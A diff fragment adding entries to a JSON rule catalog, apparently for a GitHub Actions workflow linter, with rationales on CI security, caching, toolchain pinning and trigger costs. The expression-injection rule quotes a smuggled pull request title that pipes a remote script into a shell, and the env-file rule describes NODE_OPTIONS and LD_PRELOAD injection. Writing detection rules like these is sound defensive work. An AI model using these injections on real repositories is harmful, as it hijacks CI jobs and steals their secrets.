+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/toolchain-version-drift",
+      "metadataSha256": "8df1ec7208b6386248e08af78fdb9499232d1ae773812ed60de8cdb11b76673d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows should agree on the toolchain version they install with each setup action."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "registries/ghcr",
+      "metadataSha256": "5901f90f413668cae55a87e08be4a782b93dc043d623645a61514c623a1e506c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Container images built in CI should be published to GitHub Container Registry (ghcr.io)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Publishing to GHCR keeps images next to the code: the workflow's GITHUB_TOKEN can push without long-lived registry secrets, packages inherit organization permissions and link to the repository, and runners pull from GHCR without Docker Hub's anonymous rate limits. Shared base and dependency layers published once to GHCR can then be reused by every service in the monorepo."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "registries/github-npm",
+      "metadataSha256": "7b9be7867143022f2e769d773657c6710ee21d7b1e2fb7f4004add514a0e9916",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Internal scoped npm packages should be published to the GitHub npm registry (npm.pkg.github.com)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Publishing internal packages to GitHub Packages keeps them next to their source: Actions publish and install with the workflow's GITHUB_TOKEN instead of long-lived npm tokens, access follows organization and repository permissions, and small composable packages can be versioned and consumed independently by every repository and container build in the organization."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/env-file-injection",
+      "metadataSha256": "899ea267e40bd9afadc98de79bfe72261ba22e6a42d5bf4694d13ac9040f81eb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/excessive-permissions",
+      "metadataSha256": "2563bfbcd427a65da7f0207da75e4a29b9eada31e37268be30e6fa45698103b1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/expression-injection",
+      "metadataSha256": "912defcadafb7c56aba301fd8e6a613572d189cfbd805481f4ceabe9338ff71a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": 'Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.'
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/install-scripts-privileged",
+      "metadataSha256": "c802f79226514eb8e921b1c2ccbd3ba491cf078b5959418584d304dd6f3a6117",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/mutable-remote-ref",
+      "metadataSha256": "92e1964aefc8155f2af3545c3f3aee55979375504bf8725dcfb1c3f24f8ca9fa",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/persisted-credentials",
+      "metadataSha256": "83edf545a7499aff3f2d2e1b194d49c6e57ae963a1d3f3fae2d73e4b2b008355",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/privileged-cache-restore",
+      "metadataSha256": "896a51a24efea253bfbcb27bf90530b3d04372fcd50d86ac1989c24469180b49",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/secrets-bulk-expose",
+      "metadataSha256": "daa3d29ffdea7f151b7623d9ca98c10b05d92a5c929f83a6ba3287d7448f205b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/untrusted-checkout",
+      "metadataSha256": "020244a79c6b3391e3eb938c6facbffbffef1cc1c7ce0752122fbea1f41bf774",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a \"pwn request\"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/cache-disabled-install",
+      "metadataSha256": "ec5b54d4547245bf6a3c8606b7946869269aebb920c62dbf4f95b4d320ced39c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review installs that appear to clear or bypass a configured package-manager cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Clearing or bypassing compatible restored package-manager entries can cause avoidable work. Restore/save operations are conditional, and clearing a cache does not necessarily require a registry download. Verify actual cache paths, command ordering, install behavior and any correctness or isolation requirement before changing the workflow."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/fixed-sleep",
+      "metadataSha256": "9441c829db209cf413b25955843a22b1c08fd8530697b8a73e43ed905400636b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Run steps should wait for services to become ready instead of sleeping for a fixed time."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A fixed delay can outlast service startup or finish before the service is ready. A bounded readiness check can reduce unnecessary waiting and report timeout failures, but its health predicate, polling interval and timeout must match the workload. Preserve deliberate rate-limiting or propagation delays rather than assuming every sleep is redundant."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/masked-failures",
+      "metadataSha256": "5dc155a5f9d7207da3437e29d37f7a468c0d751b5a8e3779f05cca35f1e81d22",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Test failures should fail the job, not be silenced by `continue-on-error: true` or `|| true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/playwright-browser-cache",
+      "metadataSha256": "1fc2072ef842b63679a59b889e35f3c5e6a8c227b1186039e450f74612d77025",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Evaluate browser reuse when Playwright downloads are a measured bottleneck."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`playwright install` may download missing browser builds; runner images or existing caches may already supply them. Restoring an archive can cost as much as downloading the browsers, and Linux OS dependencies still need installation. Inspect actual install/restore timings and version/platform compatibility before choosing a browser cache or matching Playwright image."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/tool-incremental-cache",
+      "metadataSha256": "50bd7fefc29ed39dad06d73bf31de8747593bba817d64e27ab3b48dfe8495e19",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "ESLint, tsc and Jest should keep their incremental caches between CI runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can reuse compatible prior work. Fresh jobs may lack that state, but persistent runners and tool-managed caches can already provide it. Cache restoration, invalidation and upload costs can outweigh savings; measure repeat runs rather than assuming runtime becomes proportional to changed files."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/unconditional-debug-upload",
+      "metadataSha256": "2de3be9321d1dc8e4104dd6be2eb00d3fffb718799f1018d6be3aa6c536d8467",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consider failure-only uploads for test artifacts used solely for debugging."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A step's default success condition can skip a debugging upload after an earlier unhandled failure. When successful-run artifacts are not needed, `if: failure()` may avoid unnecessary transfers while retaining failure diagnostics. Visible conditions and consumers are only a heuristic: verify artifact consumers, continue-on-error behavior and diagnostic needs before changing the condition."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/watch-mode-in-ci",
+      "metadataSha256": "9327fbe1fbbbd7c3159758af9a533e55087f1b13541a0f8171340c72d78ab9b8",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Test runners and compilers in CI should run once instead of in watch mode."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/bazel-missing-version-pin",
+      "metadataSha256": "c4bd5ff7d4621a7fc03ec270f22f83f08e9d802806851c7cc37e0507aaa5eaab",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Bazel workspaces built in CI should pin the Bazel version in a checked-in `.bazelversion` file."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Bazelisk resolves Bazel using its environment/configuration and version file. Without a visible choice, its fallback can track newer releases; floating labels intentionally do so. Plain Bazel does not select versions this way, so only explicit bazelisk commands or bazel commands after a recognized Bazelisk setup are considered. External configuration, cache state and installer versions can change resolution. An exact reviewed release constrains the tool version, not whole-build reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/go-mod-mutable-override",
+      "metadataSha256": "b6aa8d93e1870b916b3ba06f49b9fcbffb8318c512c1bc3abbd343cd9e0bd60f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI should not let Go build commands rewrite go.mod and go.sum (`-mod=mod`, GOFLAGS, or a `go get` before building)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "In modern module-aware Go builds, -mod=mod permits go.mod updates when module loading needs them. Since Go 1.16 the ordinary default is readonly unless automatic vendor mode or other configuration applies. Readonly restricts go.mod updates, not every go.sum write; go mod download may also update sums. These flags do not prove an actual graph change or absence of review. If both files must remain unchanged, verify their diff after all resolving commands."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-build-cache-disabled",
+      "metadataSha256": "20a16f42726a2c7e50f725897ed30ee2815cde12c53df6902fe053141bf94332",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gradle builds run in CI should enable the build cache with `org.gradle.caching=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Gradle's build cache is opt-in. It can reuse eligible task outputs when matching cache entries are available; ordinary up-to-date checks and existing outputs can still avoid work without it. Reuse across ephemeral runners requires cache persistence or a remote cache. Custom tasks must declare their inputs correctly before caching is safe. This detector only sees repository configuration and workflow invocations, not user-home properties, external init scripts or runtime cache hits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-configuration-cache-disabled",
+      "metadataSha256": "a377733a1e1b6aa82894fb9d7d85f53275f1c98829f73fe12017d47f66fa7f13",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gradle 8.1+ builds run in CI could enable the configuration cache with `org.gradle.configuration-cache=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A compatible configuration-cache entry can avoid repeating configuration for matching tasks and inputs and allow more task concurrency. Entry availability, worker limits, task dependencies and plugin compatibility determine the benefit. The cache became stable in Gradle 8.1; this detector sees repository properties and explicit invocation options, not all user-home/init-script configuration. Validate isolation, secret handling and persistence before opting in."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-parallel-disabled",
+      "metadataSha256": "621e8549b96c1414cea50c38064f21e1216067793138fb06742043fb62ef24c0",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-project Gradle builds run in CI could execute independent subprojects in parallel with `org.gradle.parallel=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Enabling parallel project execution can overlap independent subproject tasks, subject to task dependencies, worker limits and shared-resource constraints. Other concurrency, including worker APIs or configuration-cache task execution, may already exist. Source-level include declarations do not establish an independent runtime task graph. Measure representative builds and validate shared mutable state before changing scheduling."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/python-pip-no-hash-check",
+      "metadataSha256": "e7e19da11cc67a56eb87e34af7a89dbc6c6db6130a6bd87d037f7788755c5acb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI installs fully pinned requirements files with pip without hash-checking mode (`--hash` entries and `--require-hashes`)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A version pin does not identify a unique distribution archive. Hash-checking mode checks downloaded requirement artifacts against independently reviewed hashes, rather than relying only on hashes supplied by the index. Every requirement and transitive dependency needs a pin and hash. Multiple allowed wheels, platforms and source-build dependencies can still produce different environments: hash checking is an artifact-integrity control, not a proof of reproducible or hermetic builds. External pip configuration is not evaluated."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-cargo-incremental-in-ci",
+      "metadataSha256": "4f4cffbd31c1c064c3a0ecf9b379f6faf1a58e5c0d68228e2bbb1d90852623f9",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review incremental compilation tradeoffs in CI jobs that cache Cargo's `target/` directory."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Incremental compilation writes session data that can help subsequent builds, including multiple compilations within the same CI job. Persisting it across runs may cost more than it saves; Swatinem/rust-cache removes it before saving. CARGO_INCREMENTAL=1 forces it on regardless of profile settings. Cargo 1.99 introduced a CI default of off, while older dev/test profiles default on absent overrides. Paths and cache behavior depend on toolchain/action versions. Benchmark before disabling incremental compilation; this is a tradeoff, not proof of wasted work."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-missing-locked-flag",
+      "metadataSha256": "f11ede022073cc3d949936710b7f217f8d5ee0db819b8133fe8b209473823224",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Cargo commands in CI should pass `--locked` so the committed `Cargo.lock` is enforced instead of silently rewritten."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Cargo normally reuses a compatible lockfile, but may resolve dependencies and rewrite it when manifests or configuration require a change. Absence of --locked is permission to change the lock, not evidence that it changes or that dependencies were unreviewed. --locked rejects a missing/changed lockfile; it does not prove a reproducible build or forbid network access. Apply this policy only where CI is intended to enforce a frozen dependency graph."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-toolchain-unpinned",
+      "metadataSha256": "914ce62e56d3141b28ceec1d00d1f4fc568a1e75cd4a9ca2523f5c3c1d74f3fd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI should build Rust with a pinned toolchain release rather than the floating `stable`/`nightly` channel."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Floating stable/beta/nightly selections can pick newer compiler and bundled-tool releases without a repository change. Deliberate compatibility jobs may want this. A reviewed version/date selection constrains the toolchain but does not prove reproducibility. Rust cache keys can incorporate compiler identity, while fallback/seeded entries may still provide reuse. Scoped toolchain files and explicit command/environment overrides take precedence according to rustup and installer behavior."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/uv-sync-unlocked",
+      "metadataSha256": "ca9b2f2957339fbe3c12a3e4f0c87b518ac8980bd9147c56f8ca39de1d4afec4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`uv sync` and `uv run` in CI should pass `--locked` so the committed `uv.lock` is enforced instead of silently re-locked."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Project-mode uv sync/run can update uv.lock when freshness checks require it; a compatible existing lock need not change. --locked rejects required lock changes, whereas --frozen skips freshness checks and --no-sync avoids synchronization. Environment equivalents depend on uv version and boolean values. This rule observes visible lock policy, not actual resolution, review history or whole-build reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/draft-pr-gating",
+      "metadataSha256": "4bfc94a80d06096adeb127df2b10d3e76e3535ddbbf96331252929c2bd506bcd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Skip expensive pull request jobs while the pull request is still a draft."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/frequent-schedule",
+      "metadataSha256": "10b23fc914d906a23c305e87b7ae85dff80232c3efc17a57ad38acf9dfadeaa3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid scheduled workflows that run more often than every 15 minutes."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/missing-job-condition-matrix",
+      "metadataSha256": "8c746eff9771a9cdb441586364332bab57d3001ae9bff91d18e1be09cfea3523",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gate matrix jobs on the workflow's existing change-detection job."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/noisy-pr-types",
+      "metadataSha256": "00eb7e3610794928c5924c8bda6f139fc0e2ce266d9927baf12980b7532aa16d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Do not re-run build and test workflows on pull request metadata events such as labels or edits."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/serialized-matrix",
+      "metadataSha256": "b5d723734a709d1c85365117ffae98aaca1c8547b6144b668c354a1a0733a847",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid throttling a matrix with a `max-parallel` far below its number of legs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/shard-fail-fast",
+      "metadataSha256": "e005d8949e84b82d1417300d6d2e82cbd21f0ea5495d8f0bb86979ead0e8c9b1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Let sharded pull request test matrices stop early when one shard fails."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/workflow-run-chain",
+      "metadataSha256": "b06d23c5a864c90e785f4818e6f5612f4a18512d1062fd5547805c48f29454cc",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A completed `workflow_run` subscription waits for the upstream workflow, which may include jobs the follow-up does not need. A dependent job can express narrower prerequisites, but it still has scheduling and runner costs; consolidation does not guarantee a faster run. Preserve deliberate privilege boundaries, trigger semantics and artifact dependencies, then measure whether the changed dependency graph reduces waiting."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/artifact-retention",
+      "metadataSha256": "bf8ef49653bcab05950fdb34bf5e07cea531a8ab22c56e9ec32319fb4e0559be",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Uploaded artifacts should set a short `retention-days` instead of the repository default."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Artifacts are kept for the repository default (90 days unless changed) and count against Actions storage. Agent-driven repositories produce many runs per day, so build outputs that only feed later jobs pile up quickly; a short retention keeps storage and quota headroom without slowing anything down."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/concurrency",
+      "metadataSha256": "a936c1f146e39da184e57ebaa76bbe9c79202bc21988104cfe8644d69d41d1b7",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Pull request workflows should cancel superseded runs; deploy workflows must not."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Agents push many small commits. Without a concurrency group every push keeps running to completion, wasting runner minutes and delaying feedback. Deploy and release workflows must never cancel in-progress runs."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
